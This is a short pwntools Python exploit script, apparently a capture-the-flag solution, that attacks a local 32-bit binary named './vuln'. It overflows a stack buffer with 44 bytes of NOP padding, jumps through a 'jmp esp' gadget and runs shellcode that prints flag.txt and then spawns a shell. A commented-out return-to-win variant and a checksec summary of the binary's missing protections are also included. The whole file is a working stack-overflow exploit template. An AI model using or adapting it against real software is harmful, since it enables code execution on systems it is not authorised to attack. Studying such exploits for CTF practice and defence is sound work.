#!/usr/bin/env python3

from pwn import *

exe = "./vuln"
elf = context.binary = ELF(exe)
context.log_level = "debug"

# host,port = '',

p = process(exe)
# p = remote(host,port)

padding = 44
"""
payload = flat(
    asm('nop')*padding,#padding to reach EIP
    elf.symbols.win,
    elf.symbols.main,
)
"""

jmp_esp = asm("jmp esp")
jmp_esp = next(elf.search(jmp_esp))

shellcode = asm(shellcraft.cat("flag.txt"))
shellcode += asm(shellcraft.sh())

payload = flat(
    asm("nop") * padding,  # padding to reach EIP
    jmp_esp,
    asm("nop") * 16,
    shellcode,
)

p.sendlineafter(b":", payload)
p.interactive()

"""
Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments

"""
